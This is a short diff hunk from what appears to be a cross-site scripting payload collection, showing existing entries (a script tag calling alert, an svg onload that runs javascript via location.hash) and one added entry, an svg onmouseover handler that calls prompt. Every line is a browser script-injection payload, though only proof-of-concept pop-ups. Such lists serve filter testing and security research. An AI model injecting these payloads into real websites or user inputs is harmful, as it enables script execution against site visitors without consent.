@@ -112,7 +112,7 @@ content['alert'](6)
  <script>alert`/`</script>
  <svg/onload=location='javascript:/*'%2blocation.hash> #*/alert(1) 
  
- 
+ <svg  onmouseover=navigator.vibrate(prompt(1)) >
  
  
  
